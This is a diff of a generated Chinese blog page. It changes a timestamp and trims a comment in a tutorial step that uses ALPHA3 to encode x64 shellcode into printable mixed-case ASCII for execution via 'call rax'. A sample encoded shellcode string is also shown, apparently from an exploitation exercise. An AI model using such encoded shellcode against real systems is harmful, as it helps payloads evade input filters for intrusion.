@@ -208,7 +208,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2025-01-31 14:11:58 / 修改时间：20:12:34" itemprop="dateCreated datePublished" datetime="2025-01-31T14:11:58+08:00">2025-01-31</time>
+              <time title="创建时间：2025-01-31 14:11:58 / 修改时间：20:23:36" itemprop="dateCreated datePublished" datetime="2025-01-31T14:11:58+08:00">2025-01-31</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -304,7 +304,7 @@
 <h3 id="2-将上述代码保存成sc-py放到alpha3目录下，然后执行如下命令生成待编码的shellcode文件"><a href="#2-将上述代码保存成sc-py放到alpha3目录下，然后执行如下命令生成待编码的shellcode文件" class="headerlink" title="2.将上述代码保存成sc.py放到alpha3目录下，然后执行如下命令生成待编码的shellcode文件"></a>2.将上述代码保存成sc.py放到alpha3目录下，然后执行如下命令生成待编码的shellcode文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sc.py &gt; sc</span><br></pre></td></tr></table></figure>
 
 <p><strong>3.使用alpha3生成string.printable （这里得用 python2）</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;sc&quot;  #这里的参数 rax 是需要填入执行 shellcode 的那个寄存器（call                                                              rax）</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;sc&quot;  #这里的参数 rax 是需要填入执行 shellcode 的那个寄存器</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode=<span class="string">&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span></span><br></pre></td></tr></table></figure>
 
